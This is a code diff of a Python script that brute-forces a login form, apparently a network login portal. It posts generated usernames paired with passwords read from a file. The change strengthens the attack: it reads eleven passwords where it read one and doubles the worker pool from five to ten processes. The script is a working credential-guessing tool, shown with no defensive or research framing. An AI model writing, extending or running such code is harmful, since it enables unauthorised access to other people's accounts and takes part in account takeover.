@@ -14,7 +14,7 @@ def get_next_id():
 
 def iterate_for_one_id(j):
     for i in range(len(parray)):
-        #print(j + "  " + parray[i]);
+        #print(j);
         dataToSend = urllib.parse.urlencode({'mode': '191','isAccessDenied': '', 'url': '', 'username': j, 'password': parray[i], 'saveinfo': ''  }).encode('utf-8')
         req = urllib.request.Request(url, dataToSend)
         response = urllib.request.urlopen(req,context=context)
@@ -27,11 +27,11 @@ def iterate_for_one_id(j):
 
 fo = open("password.txt", "r", 1)
 parray = []
-for i in range(1) :
+for i in range(11) :
     parray.append(fo.readline())
 fo.close()
 
-pool = Pool(5)
+pool = Pool(10)
 
 generator = get_next_id()
 
